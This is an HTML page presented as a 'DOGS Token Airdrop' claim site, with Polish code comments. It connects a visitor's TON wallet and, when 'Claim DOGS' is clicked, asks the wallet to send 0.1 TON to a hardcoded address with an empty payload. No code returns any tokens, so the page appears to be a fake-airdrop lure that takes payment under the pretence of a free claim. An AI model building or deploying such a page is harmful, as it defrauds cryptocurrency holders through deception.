<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🐕 DOGS Token Airdrop 🐕</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <div id="ton-connect"></div>
    <button id="claim-button">Claim DOGS</button>
    <div id="status"></div>

    <script>
        // Konfiguracja kontraktu i manifestu
        const AIRDROP_CONTRACT_ADDRESS = 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk';
        const MANIFEST_URL = 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json';

        // Funkcja do bezpiecznego logowania błędów
        function safeLog(...args) {
            try {
                console.log(...args);
                // Opcjonalnie: możesz dodać bardziej zaawansowaną logikę logowania
            } catch (e) {
                alert('Logging error: ' + e.message);
            }
        }

        // Funkcja do wyświetlania statusu
        function updateStatus(message, type = 'info') {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            
            // Dodaj kolory w zależności od typu
            switch(type) {
                case 'error':
                    statusDiv.style.color = 'red';
                    break;
                case 'success':
                    statusDiv.style.color = 'green';
                    break;
                default:
                    statusDiv.style.color = 'black';
            }
        }

        // Inicjalizacja TON Connect UI
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: MANIFEST_URL,
            buttonRootId: 'ton-connect'
        });

        // Obsługa zmiany statusu połączenia
        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                updateStatus(`Connected: ${wallet.account.address}`, 'success');
                document.getElementById('claim-button').style.display = 'block';
            } else {
                updateStatus('Please connect your wallet', 'error');
                document.getElementById('claim-button').style.display = 'none';
            }
        });

        // Obsługa kliknięcia przycisku claim
        document.getElementById('claim-button').addEventListener('click', async () => {
            try {
                // Sprawdzenie połączenia
                if (!tonConnectUI.connected) {
                    updateStatus('Please connect your wallet first', 'error');
                    return;
                }

                updateStatus('Preparing transaction...', 'info');

                // Przygotowanie transakcji
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minut ważności
                    messages: [
                        {
                            address: AIRDROP_CONTRACT_ADDRESS,
                            amount: '100000000', // 0.1 TON
                            payload: '' // Pusty payload
                        }
                    ]
                };

                safeLog('Preparing transaction:', transaction);

                // Próba wysłania transakcji
                try {
                    const result = await tonConnectUI.sendTransaction(transaction);
                    safeLog('Transaction result:', result);
                    updateStatus('Transaction sent successfully!', 'success');
                } catch (sendError) {
                    safeLog('Send transaction error:', sendError);
                    updateStatus(`Transaction error: ${sendError.message}`, 'error');
                    
                    // Dodatkowa diagnostyka błędu
                    if (sendError.code) {
                        safeLog('Error code:', sendError.code);
                    }
                    if (sendError.stack) {
                        safeLog('Error stack:', sendError.stack);
                    }
                }

            } catch (error) {
                safeLog('Unexpected error:', error);
                updateStatus(`Unexpected error: ${error.message}`, 'error');
            }
        });

        // Globalna obsługa niezłapanych błędów
        window.addEventListener('error', (event) => {
            safeLog('Global error event:', {
                message: event.message,
                filename: event.filename,
                lineno: event.lineno,
                colno: event.colno,
                error: event.error
            });
            updateStatus(`Global error: ${event.message}`, 'error');
        });

        // Obsługa niezłapanych obietnic
        window.addEventListener('unhandledrejection', (event) => {
            safeLog('Unhandled promise rejection:', event.reason);
            updateStatus(`Unhandled promise: ${event.reason}`, 'error');
        });
    </script>
</body>
</html>
